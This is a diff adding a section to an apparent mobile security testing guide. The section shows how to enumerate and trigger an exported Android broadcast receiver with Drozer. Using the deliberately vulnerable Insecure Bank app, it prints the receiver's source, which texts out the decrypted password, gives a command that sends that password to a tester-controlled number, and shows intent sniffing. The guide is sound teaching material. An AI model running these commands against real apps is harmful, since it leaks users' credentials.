@@ -353,6 +353,78 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
   Empty
 ```
 
+##### Broadcasts
+
+Broadcasts can be enumerated using the Drozer module `app.broadcast.info`, the target package should be specified using the `-a` parameter:
+
+```
+dz> run app.broadcast.info -a com.android.insecurebankv2
+Package: com.android.insecurebankv2
+  com.android.insecurebankv2.MyBroadCastReceiver
+    Permission: null
+```
+
+In the example app "Android Insecure Bank"<sup>2</sup>, we can see that one broadcast receiver is exported, not requiring any permissions, indicating that we can formulate an intent to trigger the broadcast receiver. When testing broadcast receivers, static analysis must also be used to understand the functionality of the broadcast receiver.
+
+In the extract below taken from the source code of the target application, we can see that the broadcast receiver triggers a SMS message to be sent containing the decrypted password of the user.
+
+```java
+public class MyBroadCastReceiver extends BroadcastReceiver {
+  String usernameBase64ByteString;
+  public static final String MYPREFS = "mySharedPreferences";
+
+  @Override
+  public void onReceive(Context context, Intent intent) {
+    // TODO Auto-generated method stub
+
+        String phn = intent.getStringExtra("phonenumber");
+        String newpass = intent.getStringExtra("newpass");
+
+    if (phn != null) {
+      try {
+                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
+                final String username = settings.getString("EncryptedUsername", null);
+                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
+                usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
+                final String password = settings.getString("superSecurePassword", null);
+                CryptoClass crypt = new CryptoClass();
+                String decryptedPassword = crypt.aesDeccryptedString(password);
+                String textPhoneno = phn.toString();
+                String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
+                SmsManager smsManager = SmsManager.getDefault();
+                System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);
+smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
+```
+
+Using the Drozer module `app.broadcast.send`, it is possible to formulate an intent to trigger the broadcast and send the password to a phone number within our control:
+
+```
+dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
+```
+
+This generates the following SMS:
+
+```
+Updated Password from: SecretPassword@ to: 12345
+```
+
+###### Sniffing Intents
+
+If an Android application broadcasts intents without setting a required permission or specifying the destination package, the intents are susceptible to monitoring by any application on the device.
+
+To register a broadcast receiver to sniff intents, the Drozer module `app.broadcast.sniff` should be used, specifying the action to monitor with the `--action` parameter:
+
+```
+dz> run app.broadcast.sniff  --action theBroadcast
+[*] Broadcast receiver registered to sniff matching intents
+[*] Output is updated once a second. Press Control+C to exit.
+
+Action: theBroadcast
+Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
+Extra: phonenumber=07123456789 (java.lang.String)
+Extra: newpass=12345 (java.lang.String)
+```
+
 #### Remediation
 
 -- TODO [Describe the best practices that developers should follow to prevent this issue.] --
@@ -370,10 +442,10 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
 
 ##### Info
 - [1] Sieve: Vulnerable Password Manager - https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk
+- [2] Android Insecure Bank V2 - https://github.com/dineshshetty/Android-InsecureBankv2
 
 ##### Tools
 * Drozer - https://github.com/mwrlabs/drozer
-
 
 ### Testing JavaScript Execution in WebViews
 
